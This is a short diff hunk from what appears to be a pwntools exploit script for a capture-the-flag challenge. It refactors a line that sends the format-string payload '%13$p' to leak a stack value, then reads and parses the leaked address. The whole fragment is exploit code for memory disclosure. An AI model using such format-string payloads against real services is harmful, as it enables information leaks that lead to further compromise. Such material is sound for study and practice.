@@ -12,8 +12,7 @@ p.sendline(ans.encode())
 p.recvuntil(b'cmd: ')
 p.sendline(b'write')
 p.recvuntil(b'data: ')
-payload = b'%13$p'
-p.sendline(payload)
+p.sendline(b'%13$p')
 p.sendline(b'read')
 p.recvuntil(b'data:\n')
 res = p.recvline().strip().decode()[2:10]
